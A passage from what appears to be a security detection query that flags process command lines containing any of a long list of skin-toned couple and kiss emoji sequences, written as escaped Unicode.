\"\ud83d\udc8f\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc8f\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc68\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc69\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83e\uddd1\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc68\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc68\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83d\udc69\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83d\udc69\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffb\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffc\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffe\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffd\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udffe\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udfff\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffb\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffc\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffd\" or tgt.process.cmdline contains \"\ud83e\uddd1\ud83c\udfff\u200d\u2764\ufe0f\u200d\ud83d\udc8b\u200d\ud83e\uddd1\ud83c\udffe\"))",
